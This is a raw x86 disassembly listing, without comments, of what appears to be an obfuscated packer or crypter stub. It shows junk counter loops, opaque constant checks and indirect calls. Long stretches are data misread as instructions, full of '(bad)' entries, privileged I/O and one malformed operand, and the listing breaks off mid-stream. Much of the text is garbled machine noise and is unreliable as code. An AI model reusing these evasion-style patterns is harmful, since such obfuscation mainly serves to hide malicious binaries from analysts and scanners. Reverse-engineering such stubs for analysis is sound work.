  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x3a29d08f
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401aed
  401a76:	push   cs
  401a77:	cld    
  401a78:	outs   dx,DWORD PTR ds:[esi]
  401a79:	fisttp DWORD PTR [ebp-0x7e]
  401a7c:	push   edi
  401a7d:	dec    eax
  401a7e:	je     0x401a2c
  401a80:	mov    ds:0x48987e39,eax
  401a85:	sbb    edx,DWORD PTR [ecx]
  401a87:	cmp    BYTE PTR [edx+ebx*4],al
  401a8a:	repz ror DWORD PTR [ebp+0x2d0c1f84],0x84
  401a92:	mov    DWORD PTR ds:0xc807cec9,ebx
  401a98:	fisub  WORD PTR [ebx+eiz*1-0xc02c2fd]
  401a9f:	adc    ch,BYTE PTR [esi]
  401aa1:	call   0xfcbd9f24
  401aa6:	sub    DWORD PTR [ebp+0x20],edi
  401aa9:	and    cl,BYTE PTR [ecx-0x4344f185]
  401aaf:	(bad)  
  401ab0:	out    0x18,al
  401ab2:	mov    ebp,0x2b48dcc2
  401ab7:	mov    bl,0x90
  401ab9:	jle    0x401aa6
  401abb:	xchg   ecx,eax
  401abc:	iret   
  401abd:	stc    
  401abe:	(bad)  
  401abf:	std    
  401ac0:	in     al,0x95
  401ac2:	xor    eax,0xa98c4fcf
  401ac7:	bound  esi,QWORD PTR [edi-0x494c9c73]
  401acd:	mov    ecx,0xbed8f8b
  401ad2:	cmp    bh,BYTE PTR [ebp+0x7d21b0e]
  401ad8:	test   al,0x25
  401ada:	jno    0x401b4a
  401adc:	xor    al,0xe5
  401ade:	mov    ebx,?
  401ae0:	pop    eax
  401ae1:	pusha  
  401ae2:	mov    bh,0xd0
  401ae4:	leave  
  401ae5:	push   cs
  401ae6:	cmp    eax,0x267eb14b
  401aeb:	ins    BYTE PTR es:[edi],dx
  401aec:	bound  edi,QWORD PTR ds:0x804b9744
  401af2:	cdq    
  401af3:	outs   dx,DWORD PTR ds:[esi]
  401af4:	enter  0x4eec,0x71
  401af8:	lahf   
  401af9:	sub    eax,esi
  401afb:	pop    ss
  401afc:	(bad)  
  401afd:	push   ebp
  401afe:	imul   ecx,DWORD PTR [eax+0x1c],0x75
  401b02:	int3   
  401b03:	jns    0x401b5d
  401b05:	jge    0x401ab8
  401b07:	add    ah,BYTE PTR [eax]
  401b09:	and    DWORD PTR ds:0x57e3901e,eax
  401b0f:	mov    WORD PTR [eax-0x68],gs
  401b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b13:	pop    eax
  401b14:	xor    al,0xa
  401b16:	ror    esi,1
  401b18:	ds jl  0x401b86
  401b1b:	push   es
  401b1c:	cwde   
  401b1d:	cdq    
  401b1e:	int3   
  401b1f:	push   ds
  401b20:	sub    ebp,eax
  401b22:	dec    edx
  401b23:	sbb    bh,cl
  401b25:	fsub   st,st(5)
  401b27:	cmp    ch,bh
  401b29:	xor    edi,ecx
  401b2b:	jle    0x401b67
  401b2d:	jmp    0x401b34
  401b2f:	inc    eax
  401b30:	mov    al,0x75
  401b32:	sub    eax,0x3c0477bd
  401b37:	mov    esp,0x356cabe3
  401b3c:	dec    ebx
  401b3d:	jno    0x401bac
  401b3f:	xor    ebx,DWORD PTR [esi+0x73]
  401b42:	je     0x401b78
  401b44:	cmp    DWORD PTR [edx],edx
  401b46:	(bad)  
  401b48:	push   ecx
  401b49:	(bad)  
  401b4a:	sub    BYTE PTR [edi+0x46e24410],dl
  401b50:	fwait
  401b51:	repz jg 0x401bbb
  401b54:	sub    bl,ch
  401b56:	sbb    BYTE PTR [ebx-0x3b],0x3c
  401b5a:	mov    BYTE PTR [ecx-0x740c3fee],cl
  401b60:	jmp    0x68432722
  401b65:	adc    al,0xaf
  401b67:	sahf   
  401b68:	lds    esi,FWORD PTR [edx]
  401b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b6b:	pusha  
  401b6c:	lea    edx,ds:0xba0fd8ab
  401b72:	add    DWORD PTR [ecx+0x6d],esp
  401b75:	jmp    0x401b2b
  401b77:	pop    ss
  401b78:	loop   0x401b6a
  401b7a:	xor    bl,BYTE PTR [ecx-0x76]
  401b7d:	xor    bh,BYTE PTR [esi+0x4b]
  401b80:	pop    ecx
  401b81:	or     BYTE PTR ds:0xb08474f0,bl
  401b87:	into   
  401b88:	xchg   ebp,eax
  401b89:	loop   0x401be2
  401b8b:	push   es
  401b8c:	xchg   edx,eax
  401b8d:	mov    ecx,0x6c447bec
  401b92:	ret    0x3cdc
  401b95:	fld    QWORD PTR [esi+0x3f834eed]
  401b9b:	ror    eax,0x7c
  401b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b9f:	fsub   DWORD PTR [edi]
  401ba1:	cs inc esi
  401ba3:	std    
  401ba4:	scas   al,BYTE PTR es:[edi]
  401ba5:	push   cs
  401ba6:	jbe    0x401c0f
  401ba8:	push   ebx
  401ba9:	xchg   BYTE PTR [ecx],ah
  401bab:	cmp    dh,ch
  401bad:	lods   al,BYTE PTR ds:[esi]
  401bae:	push   ebp
  401baf:	shl    DWORD PTR [ebp+0x66],0xd6
  401bb3:	imul   BYTE PTR [esi-0x4e714a30]
  401bb9:	lock and al,0x80
  401bbc:	add    esi,DWORD PTR [edi-0x527db96]
  401bc2:	fadd   QWORD PTR [ecx+0x7954e505]
  401bc8:	fcmovb st,st(4)
  401bca:	les    ebx,FWORD PTR [edi]
  401bcc:	dec    ebx
  401bcd:	add    bh,al
  401bcf:	or     al,0x2
  401bd1:	lds    esi,FWORD PTR ds:0x338c59e7
  401bd7:	jge    0x401b64
  401bd9:	fbld   TBYTE PTR [ecx]
  401bdb:	xchg   ebp,eax
  401bdc:	fistp  DWORD PTR [edx]
  401bde:	and    al,0xc
  401be0:	fs mov eax,es:0x771ade1f
  401be7:	pop    esi
  401be8:	jns    0x401c02
  401bea:	mov    ch,0x25
  401bec:	dec    edi
  401bed:	push   ss
  401bee:	pop    esp
  401bef:	push   esp
  401bf0:	loopne 0x401c6a
  401bf2:	sbb    eax,0x8398d467
  401bf7:	es push cs
  401bf9:	adc    al,0x11
  401bfb:	xchg   ecx,eax
  401bfc:	and    al,0x30
  401bfe:	sbb    BYTE PTR [eax+edx*1-0x2d],cl
  401c02:	das    
  401c03:	xchg   edi,eax
  401c04:	test   eax,0xd5d0f04d
  401c09:	push   cs
  401c0a:	or     DWORD PTR [ebx+0x6cf07d9],0x49
  401c11:	and    dl,BYTE PTR [ebx+0x22ef6298]
  401c17:	xchg   BYTE PTR ds:0x458dd3f8,bh
  401c1d:	hlt    
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	mov    esp,0x3015a0d0
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cdf
  401c9d:	xor    esi,DWORD PTR [ecx+0x56]
  401ca0:	sahf   
  401ca1:	inc    edx
  401ca2:	out    0x1c,eax
  401ca4:	(bad)  
  401ca5:	aas    
  401ca6:	repz mov ds:0xa6411982,eax
  401cac:	int3   
  401cad:	dec    ecx
  401cae:	pop    ds
  401caf:	jecxz  0x401cab
  401cb1:	fisubr DWORD PTR [ecx+0x5f]
  401cb4:	retf   0xf4d0
  401cb7:	jge    0x401cfd
  401cb9:	or     ch,BYTE PTR [esi-0x28]
  401cbc:	pop    edi
  401cbd:	push   0x7f38f015
  401cc2:	or     dl,bh
  401cc4:	sar    BYTE PTR [edx],1
  401cc6:	and    eax,0x5476632
  401ccb:	mov    DWORD PTR [eax-0x1a],esp
  401cce:	sbb    DWORD PTR [esi+0x2882f1a0],edi
  401cd4:	in     eax,dx
  401cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd6:	cmp    ah,BYTE PTR [ecx-0x4c45cded]
  401cdc:	lods   al,BYTE PTR ds:[esi]
  401cdd:	ja     0x401cbc
  401cdf:	jb     0x401cb3
  401ce1:	lahf   
  401ce2:	mov    ebp,0x48c05fce
  401ce7:	or     eax,DWORD PTR [ebx]
  401ce9:	push   edi
  401cea:	popf   
  401ceb:	into   
  401cec:	test   DWORD PTR [edi],ecx
  401cee:	push   ecx
  401cef:	test   eax,0x37c3e8d8
  401cf4:	push   esp
  401cf5:	push   ds
  401cf6:	inc    ebx
  401cf7:	jge    0x401cd2
  401cf9:	xor    ecx,ecx
  401cfb:	(bad)  
  401cfc:	dec    edx
  401cfd:	or     DWORD PTR [edi+0x25],esp
  401d00:	js     0x401cf3
  401d02:	jmp    0x401d70
  401d04:	cli    
  401d05:	arpl   WORD PTR [ebp+esi*1-0x61338b87],ax
  401d0c:	arpl   WORD PTR [edi-0x74],bx
  401d0f:	and    al,0x41
  401d11:	sbb    bl,cl
  401d13:	push   ebp
  401d14:	mov    esp,0x780c1c5a
  401d19:	ja     0x401d5d
  401d1b:	and    bh,BYTE PTR [eax+0x20]
  401d1e:	lods   al,BYTE PTR ds:[esi]
  401d1f:	test   al,0xa4
  401d21:	and    eax,0x720b3446
  401d26:	and    DWORD PTR [eax+ecx*2],esi
  401d29:	inc    edi
  401d2a:	cmp    bl,ch
  401d2c:	inc    ecx
  401d2d:	sub    esi,DWORD PTR [esi-0x23]
  401d30:	sub    eax,0xd5d96443
  401d35:	fiadd  WORD PTR [ebp*1+0x6482e4d7]
  401d3c:	daa    
  401d3d:	frstor [ebp+esi*8+0x2c]
  401d41:	mul    dh
  401d43:	pop    ebx
  401d44:	call   0x7fce872f
  401d49:	adc    edi,edx
  401d4b:	xchg   BYTE PTR [edi],dl
  401d4d:	inc    esp
  401d4e:	mov    esi,0xc0fb075d
  401d53:	les    ecx,FWORD PTR [edx]
  401d55:	dec    esp
  401d56:	xchg   BYTE PTR [esi+0x626d1936],ah
  401d5c:	stos   DWORD PTR es:[edi],eax
  401d5d:	outs   dx,BYTE PTR ds:[esi]
  401d5e:	pop    es
  401d5f:	push   esp
  401d60:	and    DWORD PTR [ebx],eax
  401d62:	or     al,0x17
  401d64:	sbb    al,0x37
  401d66:	cli    
  401d67:	push   edi
  401d68:	sbb    eax,0xa702a4df
  401d6d:	pop    ecx
  401d6e:	imul   ebp,DWORD PTR [ecx+0x4a5c1445],0x773f3b2a
  401d78:	add    DWORD PTR [edx],eax
  401d7a:	sbb    DWORD PTR [edi+ecx*8],ebp
  401d7d:	shl    BYTE PTR [ebp-0x6a938b4a],cl
  401d83:	sbb    dl,BYTE PTR [eax]
  401d85:	ins    BYTE PTR es:[edi],dx
  401d86:	jecxz  0x401d93
  401d88:	xor    BYTE PTR [edi+0x4a],ah
  401d8b:	in     al,dx
  401d8c:	jmp    0xd3e9:0x87ebe7f6
  401d93:	or     BYTE PTR [esi+ebx*1+0x2f],ah
  401d97:	sub    eax,0x24b28d5
  401d9c:	jecxz  0x401de4
  401d9e:	xchg   DWORD PTR [ebx+0x1eaa6cc3],edx
  401da4:	test   DWORD PTR [ebx-0x763c6ba2],ecx
  401daa:	icebp  
  401dab:	sbb    al,0xfe
  401dad:	lods   al,BYTE PTR ds:[esi]
  401dae:	pop    esi
  401daf:	js     0x401d82
  401db1:	xor    DWORD PTR [eax-0x29bead4d],esi
  401db7:	loop   0x401e1e
  401db9:	dec    edi
  401dba:	push   ds
  401dbb:	je     0x401e05
  401dbd:	mov    ebx,0xd098dbc
  401dc2:	test   DWORD PTR [ebp+edi*8-0x43],eax
  401dc6:	cmp    eax,0x60794a99
  401dcb:	add    bh,BYTE PTR [ebp+0x9]
  401dce:	(bad)  
  401dcf:	fs inc esi
  401dd1:	jmp    0x6682a872
  401dd6:	in     al,0x33
  401dd8:	sbb    edi,DWORD PTR [eax-0x7d79f038]
  401dde:	daa    
  401ddf:	inc    esp
  401de0:	xchg   BYTE PTR [edx+edx*4],ch
  401de3:	pop    ss
  401de4:	and    DWORD PTR ds:0x55734bc1,ecx
  401dea:	mov    eax,0x65ebaefa
  401def:	test   eax,eax
  401df1:	test   BYTE PTR [edx],dl
  401df3:	cdq    
  401df4:	mov    bl,bh
  401df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401df7:	rcl    esp,cl
  401df9:	stc    
  401dfa:	inc    eax
  401dfb:	inc    edx
  401dfc:	adc    ch,BYTE PTR [edi-0x7c]
  401dff:	into   
  401e00:	hlt    
  401e01:	pop    esp
  401e02:	rcr    dh,0x63
  401e05:	js     0x401e11
  401e07:	inc    edx
  401e08:	(bad)
  401e0b:	mov    dh,0xc8
  401e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e0e:	cwde   
  401e0f:	add    al,0xa1
  401e11:	jecxz  0x401e01
  401e13:	push   ebx
  401e14:	fild   DWORD PTR [eax]
  401e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e17:	loopne 0x401dfe
  401e19:	or     edi,DWORD PTR [esi-0x37]
  401e1c:	fadd   st,st(5)
  401e1e:	daa    
  401e1f:	pop    es
  401e20:	mov    bh,0xb6
  401e22:	out    0x7a,eax
  401e24:	(bad)
  401e28:	ds push edx
  401e2a:	cmp    DWORD PTR [esi+0x50],esi
  401e2d:	sbb    BYTE PTR [ebp+0x4],cl
  401e30:	cmp    cl,BYTE PTR [edi]
  401e32:	push   ds
  401e33:	fst    QWORD PTR [eax+0xd]
  401e36:	pop    eax
  401e37:	retf   
  401e38:	into   
  401e39:	into   
  401e3a:	shl    BYTE PTR [ebp+0x33],cl
  401e3d:	mov    dh,0xef
  401e3f:	xor    dh,dl
  401e41:	je     0x401dc4
  401e43:	xor    BYTE PTR [edi-0x16d9af06],cl
  401e49:	push   edi
  401e4a:	add    al,BYTE PTR [eax]
  401e4c:	add    BYTE PTR [esi-0x75],ah
  401e4f:	inc    ebp
  401e50:	cld    
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	xchg   BYTE PTR [edi],dh
  401e82:	or     eax,0x7e075a1b
  401e87:	jle    0x401e21
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e48
  401e8d:	scas   al,BYTE PTR es:[edi]
  401e8e:	lds    edi,FWORD PTR ss:[eax-0x41ed3a45]
  401e95:	jbe    0x401e26
  401e97:	fwait
  401e98:	pop    ebx
  401e99:	inc    ecx
  401e9a:	cli    
  401e9b:	adc    eax,0xa209f800
  401ea0:	mov    cs,ebp
  401ea2:	in     eax,0xa0
  401ea4:	fsub   DWORD PTR [ecx-0x59]
  401ea7:	call   0x489c:0x86cd01ea
  401eae:	cmp    dh,al
  401eb0:	out    0x17,eax
  401eb2:	les    ecx,FWORD PTR ds:0xb78f3ad4
  401eb8:	push   edx
  401eb9:	cli    
  401eba:	mov    ch,0x82
  401ebc:	or     bl,BYTE PTR [edi]
  401ebe:	cmc    
  401ebf:	cmp    edx,esi
  401ec1:	add    eax,0x4e5be981
  401ec6:	add    dl,BYTE PTR [eax]
  401ec8:	aad    0xe6
  401eca:	pop    ebx
  401ecb:	gs popa 
  401ecd:	mov    bl,0x20
  401ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ed0:	ins    DWORD PTR es:[edi],dx
  401ed1:	or     cl,bl
  401ed3:	mov    esi,0xeac97333
  401ed8:	scas   eax,DWORD PTR es:[edi]
  401ed9:	popf   
  401eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401edb:	clc    
  401edc:	in     al,dx
  401edd:	fild   DWORD PTR [edi-0x26772e7]
  401ee3:	jge    0x401eff
  401ee5:	das    
  401ee6:	mov    dl,0x17
  401ee8:	cmc    
  401ee9:	fbld   TBYTE PTR [esi-0x76]
  401eec:	sbb    eax,0x37553ee6
  401ef1:	jl     0x401ec6
  401ef3:	jmp    0x6ce2fc15
  401ef8:	xchg   ebp,eax
  401ef9:	xor    bh,ch
  401efb:	jns    0x401ec9
  401efd:	pop    edx
  401efe:	xor    BYTE PTR [edi+0x2ee6914f],cl
  401f04:	push   ecx
  401f05:	icebp  
  401f06:	scas   al,BYTE PTR es:[edi]
  401f07:	inc    ah
  401f09:	sbb    al,0xa8
  401f0b:	call   0xd8a8:0x2b790b8d
  401f12:	pop    ss
  401f13:	sbb    BYTE PTR [eax-0x635e8fed],0x35
  401f1a:	mov    ch,0x8
  401f1c:	cs mov ch,0xc7
  401f1f:	out    0x4a,al
  401f21:	add    eax,0x49751c0a
  401f26:	adc    BYTE PTR [eax-0x5aeaed26],ah
  401f2c:	outs   dx,DWORD PTR ds:[esi]
  401f2d:	push   esi
  401f2e:	cmp    ebp,0x1bf3a9cf
  401f34:	sub    al,0x42
  401f36:	push   esi
  401f37:	adc    ebx,DWORD PTR [ebx]
  401f39:	aad    0xaa
  401f3b:	cmp    eax,0x6872af45
  401f40:	ret    0xe668
  401f43:	imul   ebx
  401f45:	sbb    eax,0xff0595c2
  401f4a:	(bad)  
  401f4c:	xchg   ecx,eax
  401f4d:	cli    
  401f4e:	popa   
  401f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f50:	ins    DWORD PTR es:[edi],dx
  401f51:	xlat   BYTE PTR ds:[ebx]
  401f53:	cmp    DWORD PTR [ecx-0x589be813],edx
  401f59:	lods   al,BYTE PTR ds:[esi]
  401f5a:	jne    0x401f9e
  401f5c:	or     eax,0xf4efe19a
  401f61:	dec    edi
  401f62:	lods   eax,DWORD PTR ds:[esi]
  401f63:	inc    esp
  401f64:	jne    0x401fdc
  401f66:	xlat   BYTE PTR ds:[ebx]
  401f67:	ds jl  0x401f66
  401f6a:	hlt    
  401f6b:	pop    ebx
  401f6c:	rol    DWORD PTR [ebx],1
  401f6e:	or     edx,DWORD PTR [esi+0x3c]
  401f71:	jle    0x401fba
  401f73:	xlat   BYTE PTR ds:[ebx]
  401f74:	xchg   edi,eax
  401f75:	das    
  401f76:	add    eax,0x455e42b2
  401f7b:	or     al,0x64
  401f7d:	aaa    
  401f7e:	fisubr DWORD PTR [ebp-0x12]
  401f81:	push   ecx
  401f82:	xor    eax,0xdec37e35
  401f87:	neg    BYTE PTR [ecx-0x2f]
  401f8a:	xchg   ebx,eax
  401f8b:	push   cs
  401f8c:	and    bh,ah
  401f8e:	retf   0x6fb3
  401f91:	cmp    BYTE PTR [ecx+0x27ee32a4],bl
  401f97:	adc    al,0x53
  401f99:	push   esi
  401f9a:	out    dx,eax
  401f9b:	mov    eax,ds:0xc853fe
  401fa0:	cmp    DWORD PTR [edx],ecx
  401fa2:	out    dx,al
  401fa3:	cwde   
  401fa4:	outs   dx,BYTE PTR ds:[esi]
  401fa5:	and    ch,BYTE PTR [eax-0x5be8b56f]
  401fab:	mov    al,ds:0x75a53d
  401fb0:	outs   dx,BYTE PTR ds:[esi]
  401fb1:	push   ebp
  401fb2:	and    BYTE PTR [eax+0x4c49ba1d],dh
  401fb8:	sub    eax,0x437c7342
  401fbd:	xor    DWORD PTR [ebp*1+0x7907cb1a],ecx
  401fc4:	mov    dh,BYTE PTR [edi-0x3b204c67]
  401fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fcb:	ins    BYTE PTR es:[edi],dx
  401fcc:	xor    ebx,DWORD PTR [eiz*1+0x187e34af]
  401fd3:	scas   eax,DWORD PTR es:[edi]
  401fd4:	into   
  401fd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fd6:	add    al,0xd9
  401fd8:	scas   al,BYTE PTR es:[edi]
  401fd9:	lds    ecx,FWORD PTR [edi-0x3300667f]
  401fdf:	or     ebp,esi
  401fe1:	mov    DWORD PTR [ebx+0x524391ee],esp
  401fe7:	sbb    BYTE PTR ds:0x41ef40a,ch
  401fed:	dec    edi
  401fee:	adc    BYTE PTR [esi+ebp*8+0xfcaf6f],ch
  401ff5:	jle    0x402025
  401ff7:	inc    ecx
  401ff8:	pop    esi
  401ff9:	repz iret 
  401ffb:	mov    BYTE PTR [eax],bh
  401ffd:	mov    ch,0x48
  401fff:	(bad)  
  402000:	shl    DWORD PTR [esi+eiz*4+0x7a],1
  402004:	bound  ebp,QWORD PTR [eax]
  402006:	sbb    esp,DWORD PTR [edx+0x603c554c]
  40200c:	outs   dx,BYTE PTR ds:[esi]
  40200d:	push   ss
  40200e:	shr    DWORD PTR [edi+0x2c14f693],1
  402014:	cmp    BYTE PTR [edx-0x54],bh
  402017:	test   BYTE PTR [ecx-0x4c],ch
  40201a:	hlt    
  40201b:	mov    eax,0x526e4f63
  402020:	retf   0x5b2c
  402023:	inc    edi
  402024:	push   ss
  402025:	pop    esp
  402026:	adc    eax,0xb4587450
  40202b:	jno    0x402052
  40202d:	jmp    0xc603:0x9aa67b74
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	imul   ecx,DWORD PTR [ecx],0xffffff93
  4020e7:	jo     0x40206d
  4020e9:	add    eax,0x7f557e7e
  4020ee:	jle    0x40216e
  4020f0:	aam    0xc3
  4020f2:	test   eax,0x20a58710
  4020f7:	adc    DWORD PTR [ebp-0x1b],ecx
  4020fa:	aas    
  4020fb:	loop   0x402118
  4020fd:	push   0x162ebcc6
  402102:	xchg   DWORD PTR [esi-0x6e9ae7c],esp
  402108:	and    al,0x47
  40210a:	cmp    eax,0xd0e05702
  40210f:	xor    eax,0x30f9fdd7
  402114:	push   edx
  402115:	sbb    eax,0x289c96d5
  40211a:	fcmove st,st(5)
  40211c:	jp     0x4020ff
  40211e:	push   ss
  40211f:	mov    bl,0xc8
  402121:	cmp    al,0x16
  402123:	xchg   esp,eax
